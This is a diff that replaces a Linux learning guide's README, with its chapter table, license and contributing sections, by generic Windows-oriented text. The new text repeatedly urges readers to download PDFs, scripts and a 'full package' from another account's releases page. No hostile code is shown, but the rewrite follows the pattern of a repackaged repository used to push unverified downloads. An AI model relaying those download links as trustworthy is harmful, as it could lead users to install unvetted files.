@@ -1,180 +1,187 @@
-<p align="center">
-  <img src="./assets/banner.svg" alt="The Ultimate Linux Guide" width="100%">
-</p>
+# 🐧 Linux - Your Complete Linux Learning Companion
 
-<p align="center">
-  <img src="https://img.shields.io/badge/OS-Linux-informational?style=for-the-badge&logo=linux&logoColor=white&color=FCC624" alt="Linux">
-  <img src="https://img.shields.io/badge/Shell-Bash-informational?style=for-the-badge&logo=gnu-bash&logoColor=white&color=4EAA25" alt="Bash">
-  <img src="https://img.shields.io/badge/License-MIT-informational?style=for-the-badge&color=blue" alt="MIT License">
-  <img src="https://img.shields.io/badge/PRs-Welcome-informational?style=for-the-badge&color=brightgreen" alt="PRs Welcome">
-  <img src="https://img.shields.io/badge/Chapters-34-informational?style=for-the-badge&color=orange" alt="34 Chapters">
-  <img src="https://komarev.com/ghpvc/?username=sovon1&label=Views&color=blueviolet&style=for-the-badge" alt="Profile Views">
-</p>
+[![Download Linux Guide](https://img.shields.io/badge/Download-Linux%20Guide-brightgreen)](https://github.com/Suman2252/Linux/releases)
 
-<h1 align="center">🐧 The Ultimate Linux Guide</h1>
+## 📝 About Linux Guide
 
-<p align="center">
-  <img src="https://readme-typing-svg.demolab.com?font=Fira+Code&weight=600&size=22&pause=1000&color=FCC624&center=true&vCenter=true&width=600&lines=From+Zero+to+Kernel+Hacker+%F0%9F%9A%80;Master+the+Terminal+%F0%9F%96%A5%EF%B8%8F;Understand+the+Kernel+%F0%9F%94%A7;Deploy+at+Scale+with+Containers+%F0%9F%90%B3;Secure%2C+Tune+%26+Monitor+like+a+Pro+%F0%9F%94%92;The+most+comprehensive+Linux+guide+on+GitHub!" alt="Typing SVG">
-</p>
+This repository offers a full Linux learning experience. It covers basic and advanced topics with detail. You will find 34 chapters, 6 cheatsheets, and over 200 commands explained. Whether you are a beginner or want to deepen your knowledge, this guide walks you through everything step-by-step.
 
-<p align="center">
-  <em>34 in-depth chapters · 6 cheatsheets · 200+ commands · Beginner → Expert</em>
-</p>
+The content is organized to help you understand Linux clearly. It covers command-line skills, shell scripting, networking, system administration, security, and container tools like Docker and Kubernetes. It also provides helpful reference sheets for quick command recall.
 
-<p align="center">
-  <img src="https://github.com/user-attachments/assets/f2d3cd46-c47a-44d8-8ab0-822e3685f2a0" width="600" alt="Linux Demo">
-</p>
+Even if you have no programming background, this guide breaks down the concepts into simple, easy steps. You can use it as a learning resource or quick reference.
+
+## 🎯 Who Is This For?
+
+- People who want to start using Linux  
+- Users who want to improve command-line skills  
+- System administrators learning new tools  
+- IT professionals checking security or network commands  
+- Students and hobbyists wanting practical Linux knowledge  
+
+If you want to move from basic use to advanced skills, this guide fits your needs.
 
 ---
 
-## 🗺️ Learning Roadmap
+## 🖥 System Requirements
 
-<table>
-<tr>
-<td align="center" width="25%">
+This guide is mainly for learning, but some sections recommend installing Linux or running Linux commands on your Windows PC using tools like Windows Subsystem for Linux (WSL). Here are some basic needs:
 
-### 🌱 Beginner
-**Chapters 01 – 08**
+- PC running Windows 10 or later  
+- At least 4 GB of RAM (8 GB recommended)  
+- 500 MB free storage for guide files and examples  
+- Active internet connection to download files and access resources  
+- Optional: Windows Subsystem for Linux (WSL) for running Linux commands directly on Windows  
 
-Terminal, filesystem, files, permissions, packages, editors
-
-*Start here if you're new*
-
-</td>
-<td align="center" width="25%">
-
-### 🌿 Intermediate
-**Chapters 09 – 16**
-
-Scripting, processes, SSH, networking, cron, backups
-
-*Ready to go deeper*
-
-</td>
-<td align="center" width="25%">
-
-### 🔥 Advanced
-**Chapters 17 – 24**
-
-Kernel internals, systemd, security, firewalls, performance, LVM
-
-*Power user territory*
-
-</td>
-<td align="center" width="25%">
-
-### 🧠 Expert
-**Chapters 25 – 34**
-
-Docker, K8s, eBPF, LFS, embedded, HA clustering, DR
-
-*Deep mastery*
-
-</td>
-</tr>
-</table>
-
-<p align="center">🌱 ➡️ 🌿 ➡️ 🔥 ➡️ 🧠</p>
+You don't need Linux pre-installed. The guide explains how to use Linux tools on Windows.
 
 ---
 
-## 📖 Table of Contents
+## 🚀 Getting Started with the Linux Guide
 
-### 🌱 Beginner
+This section explains how to get the guide files and start learning.
 
-| # | Topic | What You'll Learn |
-|---|-------|-------------------|
-| 01 | [Introduction to Linux](./01-introduction/README.md) | History, distros, open-source philosophy |
-| 02 | [Installation & Setup](./02-installation-setup/README.md) | Dual boot, VMs, WSL, cloud instances |
-| 03 | [Terminal Basics](./03-terminal-basics/README.md) | Shell, prompt, navigation, man pages |
-| 04 | [Filesystem Hierarchy](./04-filesystem-hierarchy/README.md) | FHS, key directories, everything is a file |
-| 05 | [File & Directory Operations](./05-file-directory-operations/README.md) | cp, mv, rm, find, links, wildcards |
-| 06 | [Users, Groups & Permissions](./06-users-groups-permissions/README.md) | chmod, chown, SUID/SGID, ACLs |
-| 07 | [Package Management](./07-package-management/README.md) | apt, dnf, pacman, snap, flatpak, source |
-| 08 | [Text Editors](./08-text-editors/README.md) | nano, vim, neovim essentials |
+### Step 1: Visit the Download Page
 
-### 🌿 Intermediate
+Click the big green button at the top or use this link:
 
-| # | Topic | What You'll Learn |
-|---|-------|-------------------|
-| 09 | [Shell Scripting Fundamentals](./09-shell-scripting-fundamentals/README.md) | Variables, loops, functions, exit codes |
-| 10 | [Process Management](./10-process-management/README.md) | ps, top, kill, signals, bg/fg, /proc |
-| 11 | [Disk & Storage Management](./11-disk-storage-management/README.md) | fdisk, parted, mkfs, mount, fstab |
-| 12 | [Networking Fundamentals](./12-networking-fundamentals/README.md) | ip, ss, ping, DNS, NetworkManager |
-| 13 | [SSH & Remote Access](./13-ssh-remote-access/README.md) | Keys, config, tunnels, SCP, rsync |
-| 14 | [Cron Jobs & Scheduling](./14-cron-jobs-scheduling/README.md) | cron, crontab, at, systemd timers |
-| 15 | [System Monitoring & Logs](./15-system-monitoring-logs/README.md) | journalctl, syslog, dmesg, sar |
-| 16 | [Archive, Compression & Backup](./16-archive-compression-backup/README.md) | tar, gzip, xz, rsync, borgbackup |
+https://github.com/Suman2252/Linux/releases
 
-### 🔥 Advanced
+This page lists all the available releases of the Linux guide. The latest release includes PDF files and cheat sheets for all chapters. 
 
-| # | Topic | What You'll Learn |
-|---|-------|-------------------|
-| 17 | [Advanced Shell Scripting](./17-advanced-shell-scripting/README.md) | Regex, sed, awk, xargs, traps |
-| 18 | [Kernel & System Internals](./18-kernel-system-internals/README.md) | Kernel architecture, boot, initramfs |
-| 19 | [Systemd & Service Management](./19-systemd-service-management/README.md) | Units, targets, journald, custom services |
-| 20 | [Advanced Networking](./20-advanced-networking/README.md) | iptables, nftables, VLANs, WireGuard |
-| 21 | [Security & Hardening](./21-security-hardening/README.md) | Firewalls, fail2ban, CIS benchmarks |
-| 22 | [SELinux & AppArmor](./22-selinux-apparmor/README.md) | MAC policies, troubleshooting |
-| 23 | [Performance Tuning](./23-performance-tuning/README.md) | CPU governors, cgroups, hugepages |
-| 24 | [LVM & RAID](./24-lvm-raid/README.md) | Logical volumes, snapshots, mdadm |
+### Step 2: Choose Your Download
 
-### 🧠 Expert
+Look for the latest release version and download the main PDF file. The files are usually labeled clearly, such as:
 
-| # | Topic | What You'll Learn |
-|---|-------|-------------------|
-| 25 | [Kernel Compilation & Modules](./25-kernel-compilation-modules/README.md) | Build kernels, DKMS, write modules |
-| 26 | [Docker & Containers](./26-docker-containers/README.md) | Namespaces, cgroups, Docker, Podman |
-| 27 | [Kubernetes & Orchestration](./27-kubernetes-orchestration/README.md) | kubectl, pods, services, Helm |
-| 28 | [Advanced Filesystems](./28-advanced-filesystems/README.md) | Btrfs, ZFS, ext4 internals, XFS |
-| 29 | [Virtualization & KVM](./29-virtualization-kvm/README.md) | KVM, QEMU, libvirt, cloud-init |
-| 30 | [eBPF & Advanced Tracing](./30-ebpf-tracing/README.md) | bpftrace, BCC, perf, ftrace |
-| 31 | [Linux From Scratch](./31-linux-from-scratch/README.md) | Build your own Linux from source |
-| 32 | [Embedded Linux](./32-embedded-linux/README.md) | Yocto, Buildroot, device trees |
-| 33 | [High Availability & Clustering](./33-ha-clustering/README.md) | Pacemaker, HAProxy, keepalived |
-| 34 | [Disaster Recovery](./34-disaster-recovery/README.md) | Boot rescue, fsck, grub repair |
+- Linux-Guide-vX.X.pdf  
+- Linux-CheatSheets-vX.X.pdf  
+
+Save these files to a folder on your PC where you can easily find them.
+
+### Step 3: Open the Guide Files
+
+Use any PDF reader (like Microsoft Edge, Adobe Reader, or similar) to open the PDFs. They include clickable chapters, commands, and examples.
+
+### Step 4: Follow the Chapters  
+
+Start at chapter 1 and move through at your own pace. The guide includes summaries at the end of each chapter and practice commands to try.
 
 ---
 
-### 📋 Quick References
+## 🛠 Using Linux Commands on Windows
 
-| Resource | Description |
-|----------|-------------|
-| [📝 Essential Commands](./cheatsheets/essential-commands.md) | Must-know commands at a glance |
-| [⌨️ Vim Cheatsheet](./cheatsheets/vim.md) | Vim modes, motions, and commands |
-| [🔤 Bash Scripting](./cheatsheets/bash-scripting.md) | Variables, loops, conditionals, functions |
-| [🌐 Networking](./cheatsheets/networking.md) | Networking commands reference |
-| [� Docker](./cheatsheets/docker.md) | Images, containers, compose |
-| [⚙️ Systemd](./cheatsheets/systemd.md) | Services, journalctl, targets |
-| [📚 Resources & Learning](./resources/README.md) | Books, courses, certifications |
-| [📖 Glossary](./glossary/README.md) | A–Z Linux terminology |
+The guide focuses on Linux commands. You can try these commands on your Windows PC without switching OS by using Windows Subsystem for Linux (WSL). Follow these steps:
 
----
+### Step 1: Enable WSL on Windows
 
-## 🚀 How to Use This Repository
+1. Open PowerShell as Administrator.  
+2. Run this command:
 
-1. **Complete Beginners** — Start at [Chapter 01](./01-introduction/README.md) and work through sequentially.
-2. **Some Experience** — Jump to the topic you need. Each chapter is self-contained.
-3. **Quick Reference** — Use the [cheatsheets](./cheatsheets/) for fast lookups.
-4. **Interview Prep** — Focus on chapters 06, 10, 12, 17, 18, 21 for common interview topics.
+   ```powershell
+   wsl --install
+   ```
 
-> 💡 **Tip**: Star ⭐ this repo so you can find it later. Share it with anyone learning Linux!
+3. Restart your PC when prompted.
 
----
+This installs a minimal Linux environment inside Windows.
 
-## 🤝 Contributing
+### Step 2: Choose a Linux Distribution
 
-Contributions are welcome! Please read [CONTRIBUTING.md](./CONTRIBUTING.md) before submitting a pull request.
+After restart, open the Microsoft Store and search for "Ubuntu" or another Linux version. Install your preferred distribution.
 
----
+### Step 3: Launch Your Linux Environment
 
-## 📄 License
+Open the installed Linux app from the Start menu. A terminal window will open where you can run Linux commands.
 
-This project is licensed under the MIT License — see the [LICENSE](./LICENSE) file for details.
+### Step 4: Practice Linux Commands
+
+Use the guide PDFs for detailed steps and try the commands in the terminal. This approach helps you learn by doing.
 
 ---
 
-<p align="center">
-  Made with ❤️ for the Linux community.<br>
-  <strong>If this helped you, please ⭐ star this repository!</strong>
-</p>
+## 🔧 More on Installing and Using the Guide
+
+The Linux repository includes extra resources besides the PDFs:
+
+- Cheatsheets for quick command lookup  
+- Scripts for automating common tasks  
+- Examples for Docker, Kubernetes, and system setup  
+
+These files are included in the releases. Download the full package on the release page.
+
+---
+
+## 📚 What You Will Learn
+
+Here are some main topics the guide covers:
+
+- Basic shell commands and file management  
+- Bash scripting fundamentals  
+- Using text editors like Vim and Nano  
+- Managing user accounts and permissions  
+- Networking commands and configuration  
+- Monitoring and troubleshooting tools  
+- Security best practices for Linux  
+- Containers and virtualization with Docker and Kubernetes  
+- Kernel basics and system internals  
+- DevOps concepts and automation  
+
+Each chapter explains concepts with examples and exercises to strengthen your skills.
+
+---
+
+## ❓ Common Questions
+
+### Can I use this guide without any Linux installation?
+
+Yes. You can read the PDFs and learn theory without Linux. To try commands, use WSL on Windows or install Linux on another system.
+
+### Is this guide suitable for beginners?
+
+Yes. It starts with basics and builds up gradually. You do not need prior Linux or programming experience.
+
+### What if I get stuck on a command?
+
+Check the cheatsheets included with the guide. They provide explanations for most commands. You can also search online forums or Linux communities for help.
+
+---
+
+## 📥 Download and Install
+
+Visit this page to download the latest Linux guide and related files:
+
+[Download Linux Guide](https://github.com/Suman2252/Linux/releases)
+
+Download the guide PDFs and extras you need. Store them in a folder on your computer. Open the PDFs with your reader to start learning immediately.
+
+---
+
+## 👨‍💻 How to Use the Commands Practically
+
+Try to practice the commands on Windows using WSL or a virtual machine running Linux. Running commands will help you remember and understand better than reading alone.
+
+Use your Windows File Explorer to find downloaded files, then follow examples from the guide to learn moving, creating, and managing files using Linux commands.
+
+---
+
+## 📂 File Structure in the Guide
+
+The files in the downloads include:
+
+- **Main Guide PDF:** Full tutorials and explanations by chapter  
+- **CheatSheets:** Quick command references  
+- **Sample Scripts:** Simple Bash scripts to practice automation  
+- **README:** Additional instructions and update notes  
+
+---
+
+## 🔗 Relevant Topics Covered
+
+This guide includes detailed coverage of topics such as:
+
+bash, command-line, cybersecurity, devops, docker, kernel, kubernetes, learning-resources, linux, linux-guide, linux-tutorials, networking, open-source, shell-scripting, sysadmin, terminal, ubuntu
+
+These topics help build practical Linux skills for work or personal use.
+
+---
+
+[![Download Linux Guide](https://img.shields.io/badge/Download-Linux%20Guide-brightgreen)](https://github.com/Suman2252/Linux/releases)
